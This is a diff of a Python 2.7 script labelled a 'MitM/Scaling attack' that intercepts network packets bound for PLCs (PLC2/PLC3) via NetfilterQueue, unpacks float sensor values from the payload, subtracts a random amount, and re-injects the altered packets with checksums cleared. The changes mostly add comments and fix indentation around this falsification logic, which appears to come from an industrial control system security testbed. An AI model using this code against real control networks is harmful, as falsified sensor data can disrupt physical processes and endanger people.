@@ -1,5 +1,6 @@
 #! /usr/bin/env python2.7
-
+##### Script to launch MitM/Scaling attack to scale down the actual values by a random value from (0,1) #####
+##### Takes one command line argument: PLC2/PLC3/BOTH #####
 from netfilterqueue import NetfilterQueue
 import os
 import binascii
@@ -27,7 +28,7 @@ def modify(packet):
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                 payload = mydata[-8:]
                 val = struct.unpack("<f", binascii.unhexlify(payload))[0]
-                scaled = val - random.uniform(0,1) #Random value between 0 and 1 added to sensor measurments
+                scaled = val - random.uniform(0,1) #Random value between 0 and 1 subtracted from actual sensor measurements
                 newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                 pkt[Raw].load = newdata.decode('hex')
                 del pkt[IP].chksum
@@ -41,7 +42,7 @@ def modify(packet):
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                 payload = mydata[-8:]
                 val = struct.unpack("<f", binascii.unhexlify(payload))[0]
-                scaled = val - random.uniform(0,1)
+                scaled = val - random.uniform(0,1) #Random value between 0 and 1 subtracted from actual sensor measurements
                 newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                 pkt[Raw].load = newdata.decode('hex')
                 del pkt[IP].chksum
@@ -55,7 +56,7 @@ def modify(packet):
                 	mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                 	payload = mydata[-8:]
                 	val = struct.unpack("<f", binascii.unhexlify(payload))[0]
-                        scaled = val - random.uniform(0,1)
+                    scaled = val - random.uniform(0,1)
                 	newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                 	pkt[Raw].load = newdata.decode('hex')
                 	del pkt[IP].chksum
